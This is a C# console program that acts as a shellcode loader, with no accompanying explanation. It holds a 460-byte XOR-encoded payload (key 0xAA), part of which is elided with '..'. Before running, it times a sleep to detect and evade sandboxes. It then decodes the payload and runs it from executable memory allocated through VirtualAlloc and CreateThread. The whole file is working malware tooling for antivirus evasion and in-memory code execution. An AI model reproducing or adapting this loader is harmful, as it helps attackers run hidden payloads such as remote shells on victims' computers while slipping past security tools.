using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ConsoleApp4
{
    class XORCrypter
    {
        private byte key;
        public XORCrypter(byte key)
        {
            this.key = key;
        }
        public byte[] EncryptBuf(byte[] buf)
        {
            try
            {

                for (int i = 0; i < buf.Length; i++)
                {
                    buf[i] ^= key;
                }
                return buf;

            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return null;
            }
        }
        public byte[] DecryptBuf(byte[] buf)
        {
            return EncryptBuf(buf);
        }
    }

    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

		[DllImport("kernel32.dll")]
		static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
	        DateTime t1 = DateTime.Now;
		    Sleep(2000);
		    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
		    if(t2 < 1.5)
		    {
		        return;
		    }
            byte[] encryptedBuf = new byte[460] {
0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x6a, 0xaa, 0xaa, 0xaa,
0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78,
0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2,
..
0x17, 0x37, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x82, 0x96, 0xac,
0xd6, 0xa0, 0x2a, 0x51, 0x4a, 0xdf, 0xaf, 0x11, 0xed, 0xb9,
0xd8, 0xc5, 0xc0, 0xaa, 0xf3, 0xeb, 0x23, 0x70, 0x55, 0x7f
};

            byte encryptionKey = 0xAA;
            XORCrypter crypter = new XORCrypter(encryptionKey);
            byte[] decByte = crypter.DecryptBuf(encryptedBuf);

            int size = decByte.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(decByte, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
